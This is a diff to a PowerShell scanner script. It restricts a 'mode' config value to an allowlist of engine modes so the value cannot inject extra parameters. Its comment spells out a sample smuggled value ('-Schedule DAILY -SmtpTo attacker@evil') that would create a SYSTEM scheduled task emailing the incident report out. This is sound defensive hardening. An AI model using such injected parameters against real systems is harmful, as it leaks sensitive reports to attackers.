@@ -627,7 +627,13 @@ function Resolve-Mitre {
 }
 
 # ── Extract config ──────────────────────────────────────────────────────────────
-$mode     = if ($ScanConfig.mode)    { "$($ScanConfig.mode)" }   else { 'FULL' }
+# SECURITY (C1): $mode is interpolated UNQUOTED into the child argument string below, so it
+# MUST be constrained to the exact engine mode enum. Without this, a caller (e.g. a CSRF POST
+# from any page the operator visits — the listener has wildcard CORS) could smuggle extra engine
+# parameters like "-Schedule DAILY -SmtpTo attacker@evil" → a SYSTEM scheduled task that emails
+# the incident report out. Anything not on the allowlist falls back to FULL.
+$mode     = if ($ScanConfig.mode) { ("$($ScanConfig.mode)").Trim().ToUpper() } else { 'FULL' }
+if ($mode -notin @('QUICK','FULL','DEEP','PARANOID','STEALTH')) { $mode = 'FULL' }
 $hours    = if ($null -ne $ScanConfig.hours) { [int]$ScanConfig.hours } else { 0 }
 $doHtml   = [bool]$ScanConfig.html_report
 $paranoid = [bool]$ScanConfig.paranoid
